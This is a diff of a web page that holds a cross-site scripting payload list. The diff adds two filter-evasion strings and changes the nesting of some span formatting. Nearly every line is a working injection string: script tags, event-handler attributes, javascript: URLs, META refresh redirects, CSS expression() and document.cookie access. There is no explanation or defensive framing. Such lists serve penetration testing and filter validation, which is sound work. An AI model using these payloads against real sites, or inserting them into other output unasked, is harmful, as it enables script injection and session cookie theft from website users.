@@ -13,6 +13,8 @@ svg onload=“alert(1)”<br/>
 /”&gt;&lt;svg onload=alert(1)&gt;<br/>
 \’-alert(1)//<br/>
 ’-alert(1)-‘<br/>
+”;!–“&lt;XSS&gt;=&amp;amp;amp;{()}<br/>
+//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br/>
 alert(document.cookie)<br/>
 alert(document['cookie'])<br/>
 with(document)alert(cookie)<br/>
@@ -21,8 +23,8 @@ with(document)alert(cookie)<br/>
 &lt;body onunload="javascript:alert('XSS');"&gt;<br/>
 ” onmouseover=alert(1)//<br/>
 &lt;script&gt;alert(1)&lt;/script&gt;<br/>
-<span style="font-family: sans"><span style="font-size: 10pt">&lt;script&gt;alert('CSS Vulnerable')&lt;/script&gt;<br/>
-</span></span><span style="font-family: sans"><span style="font-size: 10pt">&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;</span></span><br/>
+<span style="font-size: 10pt"><span style="font-family: sans">&lt;script&gt;alert('CSS Vulnerable')&lt;/script&gt;<br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: sans">&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;</span></span><br/>
 &lt;script src=javascript:alert(1)&gt;<br/>
 &lt;script x&gt;alert(1)&lt;/script&gt;/<br/>
 &lt;iframe src=javascript:alert(1)&gt;<br/>
@@ -55,8 +57,8 @@ with(document)alert(cookie)<br/>
 &lt;a onmouseover="alert(2)"&gt;d&lt;/a&gt;<br/>
 &lt;/a onmousemove="alert(1)"&gt;<br/>
 javascript:alert('executing script')<br/>
-&lt;font style='color:expression(alert(document.cookie))'&gt;<span style="font-size: 10pt"><span style="font-family: sans"><br/>
-</span></span><span style="font-size: 10pt"><span style="font-family: sans">&amp;{alert('CSS Vulnerable')};</span></span><br/>
+&lt;font style='color:expression(alert(document.cookie))'&gt;<span style="font-family: sans"><span style="font-size: 10pt"><br/>
+</span></span><span style="font-family: sans"><span style="font-size: 10pt">&amp;{alert('CSS Vulnerable')};</span></span><br/>
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://;URL=javascript:alert('XSS');\"&gt;<br/>
 &lt;META HTTP-EQUIV=\"refresh\"CONTENT=\"0;url=javascript:alert('XSS');\"&gt;<br/>
 &lt;img src=1.gif onerror=alert(1)&gt;<br/>
